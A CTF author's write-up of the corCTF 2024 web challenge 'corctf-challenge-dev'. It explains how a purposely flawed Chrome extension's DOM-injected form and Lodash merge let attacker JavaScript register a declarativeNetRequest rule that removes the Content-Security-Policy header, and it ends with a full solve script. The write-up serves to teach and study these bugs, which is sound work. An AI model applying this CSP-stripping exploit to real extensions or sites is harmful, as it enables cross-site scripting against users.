---
来源: https://www.cor.team/posts/corctf-2024-corctf-challenge-dev/
类型: html
获取日期: 2026-06-29
---

cor.team | corCTF 2024 - corctf-challenge-dev

[![](/img/logo.png)

## Crusaders of Rust](/)
Toggle navigation

* [Home](/)
* [Posts](/posts/)
* [Members](/members/)

#### corCTF 2024 - corctf-challenge-dev

[web](https://cor.team/tags/web)

* **Author**: drakon
* **Date**: Jul 29, 2024

# corCTF 2024 - corctf-challenge-dev

Heya. Been a while, huh?

corCTF 2024 just ended…15 seconds ago? Hopefully I timed my upload correctly. I wasn’t very heavily involved in infra this year (the afk-kon arc continues!), so not too many comments about the CTF as a whole. I contributed a single web this year – this year is the first year since 2021 that I’ve written a challenge. There were a few issues with deployment, which I’ll touch on later. Huge thanks to my friend [Strellic](https://brycec.me) for his help with putting out last minute fires.

## corctf-challenge-dev

![challenge](/img/corctf-challenge-dev/chall.png)

This challenge is 100% inspired by real events, by the way.

![ping](/img/corctf-challenge-dev/ping.png)

corctf-challenge-dev was meant to be a bit of a red-herring style XSS challenge. Since the challenge was supposed to be an easy/medium, I wanted to avoid obscure technical details as much as possible, instead focusing on logic bugs. I’m not the happiest with how this challenge turned out – the solution turned out to be much thornier to implement than I anticipated, and several teams had trouble going from bug to exploit.

Anyway, let’s start with the website. At first glance, it’s a pretty standard blog-style challenge. We can sign in, create posts, and have the admin bot visit your link.

![challenge website](/img/corctf-challenge-dev/site.png)

This is a pretty standard XSS setup. A quick glance through the templates confirms that the challenge page insecurely includes user input, which gives us an attack vector. The only thing stopping us from full-blown XSS is the CSP, which is a bit odd:

```
1res.setHeader(
2  "Content-Security-Policy",
3  `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`
4);
```

To be entirely honest, I don’t really know what this CSP is supposed to do. I threw it together in about thirty seconds, putting in whatever random things I could think of. We never use fonts at any point, nor do we actually *implement* trusted types anywhere. The `img-src` might be useful for an XS-Leak? But even that doesn’t make much sense.

As I said earlier, this challenge included a lot of red herrings. The CSP is not bypassable (to my knowledge) – we could have just as easily done `default-src 'none'`. Instead of trying to find a way to work around this CSP, we need to find a way to sidestep it entirely.

Moving on, the rest of the website is unremarkable. The code might look a little familiar – most of it is copied and pasted from previous CTF challenges[1](#fn:1); I wasn’t lying when I said I made the whole thing in 30 minutes! Again, thanks to Strellic for “donating” his code for me to use. Unless I’m a lot worse at writing Node than I thought, there shouldn’t be any problems here.

The bulk of the challenge lies in the client. The admin bot loads an extension when making its requests: FizzBlock101. This extension is meant to simulate a homerolled adblock-style extension. As you would expect from a homerolled extension, it’s riddled with errors and blatant misuse of the Chrome API.

![extension](/img/corctf-challenge-dev/extension.png)

From a high level, the extension lets you specify a list of URLs to block, which the extension will then register a [declarativeNetRequest](https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest) rule for. DNR rules are the successor to [WebRequests](https://developer.chrome.com/docs/extensions/reference/api/webRequest), which Chrome partially deprecated in Manifest V3. These rules are stored using the [chrome.storage](https://developer.chrome.com/docs/extensions/reference/api/storage) API.

What is the significance of DNR rules? Well, amongst other things, they are capable of [modifying headers](https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest#type-RuleActionType). If we can get arbitrary control of the rules, we could register a `modifyHeaders` rule that drops the `Content-Security-Policy` header, effectively allowing us to ignore the CSP entirely.

Now that we have a goal, let’s look into how we can write our own rules. There are a large number of issues with how the extension is implemented. We’ll work backwards, so bear with me for a moment.

First, and most obviously, the extension gravely misunderstands the nature of DNR rules. These rules exist globally and persistently. However, our developer seems to believe otherwise:

```
1chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
2  if (changeInfo.status == 'loading' && tab.url.indexOf(tab.index > -1)) {
3    const origin = (new URL(tab.url)).origin;
4    registerRules(origin);
5  }
6});
```

The `registerRules()` function loads an array of DNR rules for an origin using `chrome.storage` and registers them sequentially every time a tab is loaded. The point of this was to mislead competitors into believing that DNR rules did not carry across origins or page loads. Unfortunately, most competitors saw through my deception.

The global, persistent nature of DNR rules means that if we can somehow register a rule at *any point* from *any site*, we’re home free. Well, there’s one small caveat. The rules are registered like this:

```
1rule['id'] = i+1;
2chrome.declarativeNetRequest.updateDynamicRules({
3  addRules: [
4    rule
5  ],
6  removeRuleIds: [i+1]
7});
```

This is a fairly common pattern. `removeRuleIds` is processed before `addRules` is (and won’t error if the rule doesn’t exist), so specifying the same ID twice essentially replaces the rule. Since `registerRules()` is called every time a new site is loaded, this effectively means our rules are replaced every time a page loads.

It’s not too hard to work around this: `registerRules()` doesn’t actually clear the rules, just replaces them. From the setup, we see that the challenge domain has three rules registered[2](#fn:2). Simply register *four* rules, and the last one will survive replacement.

The next problem comes in how the rules are created. The extension takes a user-submitted object and merges it with the following base rule:

```
 1const base_rule = {
 2  "action": {
 3    "type": "block",
 4    "redirect": {},
 5    "responseHeaders": [],
 6    "requestHeaders": []
 7  },
 8  "condition": {
 9    "initiatorDomains": [origin],
10    "resourceTypes": ['image', 'media', 'script']
11  }
12};
```

The merge is done by calling Lodash’s merge function[3](#fn:3):

```
1const merged_obj = _.merge(base_rule, obj);
```

The user-supplied object is never verified. This means that we can overwrite any arbitrary fields. So, we can easily change the type from `block` to `modifyHeaders`. Unfortunately, the path isn’t this straightforward. The rule has a bunch of random garbage that needs to be accounted for, and unfortunately Chrome does not handle it intuitively. We’ll go through them one by one.

`redirect` we can leave empty.

`responseHeaders` takes an array of objects, each of which gives a response header to be modified. These objects have a `header` and `operation` key. To drop the CSP, we want the following object:

```
1{"header": "Content-Security-Policy", "operation": "remove"}
```

`requestHeaders` takes the same type of array, this time modifying the request headers. Unfortunately, this array *cannot* be empty[4](#fn:4). Since our `merge` gadget lets us add/modify keys but not remove them, this means we have to populate this array. We can put any garbage in here. I chose to just copy our `responseHeaders` data.

`initiatorDomains` specifies an array of, well, initiator domains that the rule will target. When not specified, the rule will match any initiator domain. Yet again, since this field *has* been specified[5](#fn:5), we’ll need to populate it. Since we’re redirecting the admin back to the website, our attacker domain is the initiator.

`resourceTypes` specifies an array of resource types (duh) that the rule will match. When omitted, the rule will match every resource *except* for `main_frame`. Unfortunately, it was specified (noticing a theme yet?). We’ll have to populate it again. There’s two approaches here: if we choose to redirect the admin, then the request will be `main_frame`. If we choose to include the challenge as an iframe, then the request will be `sub_frame`. We’ll do `main_frame`, but the specific choice doesn’t matter.

This gives us a rule that looks something like this:

```
 1{
 2  "action": {
 3    "type": "modifyHeaders",
 4    "requestHeaders": [
 5      {
 6        "header": "Content-Security-Policy",
 7        "operation": "remove"
 8      }
 9    ],
10    "responseHeaders": [
11      {
12        "header": "Content-Security-Policy",
13        "operation": "remove"
14      }
15    ]
16  },
17  "condition": {
18    "initiatorDomains": ["attacker.com"],
19    "resourceTypes": ["main_frame"],
20    "urlFilter": "*"
21  },
22  "priority": 1
23}
```

This leads us to our final error. How is the user-supplied object generated? In a real extension, this should be handled from either the popup page or the options page. Both of these pages enjoy a relatively privileged position: they’re not web-accessible by default and nearly impossible to interfere with.

Our extension doesn’t bother. It injects an HTML form into the *current DOM* and passes the form directly into `chrome.storage`! This is an obviously terrible idea, because unlike the popup/options page, any JavaScript can edit the DOM. This gives us the control over DNR rules that we wanted.

Specifically, the rule serializes the form with the following code[6](#fn:6):

```
 1function serializeForm(items) {
 2  const result = {};
 3  items.forEach(([key, value]) => {
 4    const keys = key.split('.');
 5      let current = result;
 6      for (let i = 0; i < keys.length - 1; i++) {
 7        const k = keys[i];
 8        if (!(k in current)) {
 9          current[k] = {};
10        }
11        current = current[k];
12      }
13    current[keys[keys.length - 1]] = isNaN(value) ? value : Number(value);
14  });
15
16  return result;
17}
```

This is relatively standard form-serializing code. The only two odd things here are the loop and the `isNaN` check. The loop is written this way to enable prototype pollution[7](#fn:7), and the `isNaN` check is solely there because `priority` is expected to be an integer. Everything else is fairly normal.

Unfortunately, this code is blindly called on the form. Since, again, the form is in the DOM, we can manipulate the form and add our own `input` elements. This essentially gives us full control over the object, although we can’t write arrays.

This is where the final part of the exploit comes in. If you merge an integer-indexed object *into* an array, it creates a new array. For example,

```
1console.log(_.merge([1, 2, 3], {'0': 'a', '2': 'c'}) // ['a', 2, 'c']
```

This is why our base rule was filled with so many random arrays. Besides annoying competitors, of course. Without the base arrays to build off of, it would have been impossible to construct the required rule, since we would have no way to create a syntactically valid `responseHeaders`.

That’s basically the hard part of the challenge done. The rest of the solve script is basic housekeeping: we register a `MutationObserver` so that we can hook the form properly (some teams just used a sleep), then set up a quick listener for reload to prevent infinite loops. We need to reload the page because the rules are only pulled from `chrome.storage` when a tab is loaded, so after creating our rules we need to reload to actually register them.

One last thing that tripped me up (but didn’t appear to affect any other teams) was a race condition – if you redirect back to the victim too quickly after creating the rules, they don’t get registered in time. I didn’t isolate the issue until relatively late into the CTF (3 hours before the end!), but the fix was a relatively easy sleep.

Here’s the final solve script:

```
 1<!DOCTYPE html>
 2<html>
 3<body> <!-- we need the body for the MutationObserver to hook onto -->
 4  <script>
 5    function sleep(time) {
 6      return new Promise(resolve => {
 7        setTimeout(resolve, time)
 8      })
 9    }      
10    
11    const extension_form_observer = new MutationObserver(async () => {
12      if (window.location.search.includes("reload")) {
13        sleep(500); // sleep to avoid race condition
14		// well, if you want to get technical, we don't actually avoid the race
15		// there's no way to avoid the race condition -- we can't wait until the rules are registered, since the API isn't accessible from normal JS
16		// so more accurately, "sleep to probably miss the race"
17        window.open("http://localhost:8080/challenge/[CHALLENGE_ID_HERE]");
18        return;
19      }
20
21      const form = document.querySelector('#block-options');
22      if (form) {
23        extension_form_observer.disconnect(); // ensure that we only trigger once
24        console.log("Form created!");
25
26        const fieldset = document.createElement('fieldset');
27        fieldset.id = 'pepega';
28        // some teams dynamically generated this, im lazy
29        fieldset.innerHTML = `<input name="action.type" value="modifyHeaders">
30        <input name="action.responseHeaders.0.header" value="Content-Security-Policy">
31        <input name="action.responseHeaders.0.operation" value="remove">
32        <input name="action.requestHeaders.0.header" value="Content-Security-Policy">
33        <input name="action.requestHeaders.0.operation" value="remove">
34        <input name="condition.initiatorDomains.0" value="ATTACKER.COM">
35        <input name="condition.resourceTypes.0" value="main_frame">`;
36
37        form.insertBefore(fieldset, form.childNodes[0]);
38
39        const priority = form.querySelector('#priority');
40        priority.value = 100; // arbitrary, any positive integer will do (i chose a relatively high number to take precedence from other rules, but none exist in this challenge)
41
42        const urlFilter = form.querySelector('#urlFilter');
43        urlFilter.value = '*';
44
45        console.log("Evil fieldset injected!");
46
47        const submit = form.querySelector('#submit-btn');
48        for (let i = 0; i < 10; i++) { // we only need to submit 4 times, im what the kids call "extra"
49          submit.click();
50          await sleep(250); // this is because chrome.storage is async
51        };
52        window.location.href = './solve_final.html?reload';
53       }
54    });
55    extension_form_observer.observe(document.body, {
56      childList: true,
57      subtree: true
58    });
59  </script>
60</body>
```

## Reflections

I’m a huge fan of extension challenges. `catalog` from PlaidCTF 2020 was one of my favorite challenges, and it’s always been one of my goals to write a web challenge using extensions. While certainly not as cool as catalog (which exploited STTF *and* uBlock!), I hope I did extension web some justice.

I think a lot of webbers aren’t very familiar with extension behavior, and some of the APIs get a little weird. `chrome.storage` is async, which makes sense from an objective perspective, but it still feels weird to me since `localstorage` is synchronous. Similarly, as I mentioned earlier, I wasn’t expecting DNR rules to be global and persistent – I imagined them as event listeners, which do not persist through page loads (and certainly not across origins). I think these kinds of inconsistencies – the unexpected difference between “conventional” JS and “extension” JS – are an interesting avenue for web challenges. Or maybe I’m just talking nonsense, I don’t know. I’m just a washed-up webber.

I did have a handful of other extension ideas that I didn’t manage to finish in time, so stay tuned for next year :eyes:

As far as the development process, this was one of my messier challenges. I dedicated most of my time to writing the extension, so I ended up rushing the entire website in two hours. Because time was so short, I ended up having to copy and paste other people’s code (which never feels good), and we barely managed to get the admin bot working in time. Huge apology to Strellic for all the fires he had to put out :')

Because the admin bot wasn’t finished until literally minutes before the CTF started, I didn’t have time to test my payload on remote. Problems with Puppeteer and our internal firewall meant we had to make some last-minute changes that broke aspects of our challenge. The admin bot couldn’t access the domain externally, so we changed the bot to use `localhost` at the last minute. This broke the hardcoded rules, which I didn’t notice until deep into the CTF. This had the side effect of completely tanking my solve script (due to the race condition mentioned earlier – localhost loads faster than a remote IP, so the rules didn’t load in time).

Luckily, this didn’t seem to affect the competitors too badly – several competitors managed to get stable solve scripts before I fixed mine. Still, I feel bad about the rocky deployment, particularly for the stress I caused our infra guys.

Thank you for playing corCTF 2024!

---

1. I’m not even entirely sure which challenges they’re from. The API code should be from modernblog (Strellic’s challenge from 2022), while the rest of the index is (probably) also from a previous year? [↩︎](#fnref:1)
2. In fact, these rules aren’t even registered properly. The original version of this challenge was not instanced, so I hardcoded the `https://corctf-challenge-dev.be.ax` domain. Unfortunately, instanced challenges generate their own domains, so these rules never triggered! This (along with another problem, see reflections) means that you could safely ignore this caveat in actual implementation. [↩︎](#fnref:2)
3. The version of Lodash was deliberately old. Specifically, it was vulnerable to [CVE-2018-16487](https://www.cvedetails.com/cve/CVE-2018-16487/ "CVE-2018-16487 security vulnerability details"), where `merge` was vulnerable to prototype pollution. Which, again, wasn’t relevant at all. [↩︎](#fnref:3)
4. This isn’t documented, for some reason. The text `An empty list is not allowed.` shows up multiple times in the documentation, but for some reason is *not* mentioned under `responseHeaders` and `requestHeaders`. However, if we actually try to create the rule, we’ll get the following error:  
   ![error](/img/corctf-challenge-dev/error.png)  
   The documentation isn’t the best… [↩︎](#fnref:4)
5. The extension, yet again, doesn’t do this properly. `initiatorDomains` expects a *domain* (e.g. `corctf-challenge-dev.be.ax`), but we give it an origin (e.g. `https://corctf-challenge-dev.be.ax`). This means that, under normal behavior, the rules *never trigger*. This was done on purpose – I was hoping (again) to mislead competitors. Observe that `initiatorDomains` is correctly handled in the service worker initialization. [↩︎](#fnref:5)
6. Thanks, once again, to Strellic for supplying this code! My original code was a lot more deranged (involving `tagname` :upside\_down:). [↩︎](#fnref:6)
7. Again, a red herring. [↩︎](#fnref:7)

Code copied!

const progressPath=document.querySelector(".progress-wrap path"),pathLength=progressPath.getTotalLength();progressPath.style.transition=progressPath.style.WebkitTransition="none",progressPath.style.strokeDasharray=pathLength+" "+pathLength,progressPath.style.strokeDashoffset=pathLength,progressPath.getBoundingClientRect(),progressPath.style.transition=progressPath.style.WebkitTransition="stroke-dashoffset 10ms linear";const updateProgress=()=>{const e=document.documentElement.scrollTop,t=document.documentElement.offsetHeight-window.innerHeight,n=pathLength-e\*pathLength/t;progressPath.style.strokeDashoffset=n};updateProgress();const offset=50,duration=550;document.addEventListener("scroll",e=>{updateProgress(),document.documentElement.scrollTop>offset?document.querySelector(".progress-wrap").classList.add("active-progress"):document.querySelector(".progress-wrap").classList.remove("active-progress")}),document.querySelector(".progress-wrap").addEventListener("click",e=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("load",e=>{document.querySelectorAll("pre").forEach(e=>{if(navigator.clipboard){const t=document.createElement("button");if(!e.parentElement.classList.contains("highlight")){const t=document.createElement("div");t.className="highlight",e.parentNode.insertBefore(t,e),t.appendChild(e)}t.role="button",t.className="btn btn-sm btn-outline-info copy-btn",t.innerHTML=`<i class="fas fa-clipboard" style="pointer-events: none"></i>`,t.addEventListener("click",async e=>{const t=e.srcElement.parentElement.querySelector("code"),n=Array.from(t.children).map(e=>e.children[1].innerText).join("")||t.innerText;await navigator.clipboard.writeText(n.trim()),new bootstrap.Toast(document.querySelector("#copy-toast")).show()}),e.appendChild(t)}})})window.MathJax={tex:{inlineMath:[["$","$"]]}}

[![](/img/ctftime-black.png)](https://ctftime.org/team/132628)